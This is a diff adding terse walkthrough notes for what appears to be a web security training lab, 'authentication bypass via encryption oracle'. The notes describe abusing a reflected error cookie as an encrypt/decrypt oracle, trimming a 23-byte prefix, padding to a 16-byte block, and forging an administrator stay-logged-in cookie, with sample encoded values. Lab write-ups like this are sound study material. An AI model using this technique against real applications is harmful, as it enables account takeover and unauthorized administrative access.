@@ -1,0 +1,66 @@
+Authentication bypass via encryption oracle
+Goal: Exploit logic flaw to access admin panel and delete Carlos
+wiener:peter
+
+1)
+-login
+-logout
+-login, checkmark stay logged in
+-> csrf=28yANHoFmbE13Zqv2cMqP9awZCZEEKFq&username=wiener&password=peter&stay-logged-in=on
+-> stay-logged-in=d5WOZDt8SPCosLQ1ZrsfuBRLq4B7OPXmP4S1z3dd4B0%3d
+
+2)
+-Send Get/my-account, the one with two cookies to repeater
+-Post a comment
+-Do it again with an invalid, email, note input reflected in output
+-Send post with bad email to repeater
+-notification cookie contains what ever you gave it in the email field
+-send get post to repeater
+
+3)
+-name the post without the email, encrypt
+-name the get with the three cookies, decrypt
+-Copy stay logged in cookie to notification cookie, send
+-> wiener:1723835722467
+-> administrator:1723835722467
+
+4)
+-administrator:1723835722467, put in email of encrypt, url encode
+-Send
+-Put the notification cookie in decrypt again and check it
+-Invalid email address: administrator:1723835722467
+->23 extra characters at the front
+
+5)
+-decoder
+-decode as url
+-decode as base64
+-delete first 23
+-encode as base64
+-encode as url
+%66%39%67%41%65%2b%77%38%55%6a%34%4a%78%30%72%46%52%7a%36%75%68%57%51%66%62%77%64%43%72%34%4a%36%62%33%46%33%33%46%72%4a%30%2f%6e%72%77%67%78%79%51%64%50%6c%47%68%4d%3d
+
+6)
+-repeater
+-paste in decrypter, %66%39%67%41%65%2b%77%38%55%6a%34%4a%78%30%72%46%52%7a%36%75%68%57%51%66%62%77%64%43%72%34%4a%36%62%33%46%33%33%46%72%4a%30%2f%6e%72%77%67%78%79%51%64%50%6c%47%68%4d%3d
+-Internal server error, input length must be multiple of 16 when decrypting padded cipher
+
+7)
+-Add 9 characters to make 32, Invalid email address: administrator:1723835722467
+-Invalid email address: xxxxxxxxxadministrator:1723835722467
+-Put this xxxxxxxxxadministrator:1723835722467 in the email field for encrypt and url encode
+-Send, grab output and go back to decoder
+
+8)
+-decode as url
+-decode as base64
+-delete first 32
+-encode as base64
+-encode as url
+
+9)
+-decrypt, %72%55%79%39%58%50%66%75%52%67%32%69%7a%4b%6a%39%54%70%41%5a%43%54%33%78%47%36%67%39%79%57%44%59%64%43%79%53%4d%2b%69%56%55%7a%77%3d
+-browser, right click, inspect
+-application, cookies
+-clear out session cookie, paste in stay-logged-in
+-delete Carlos
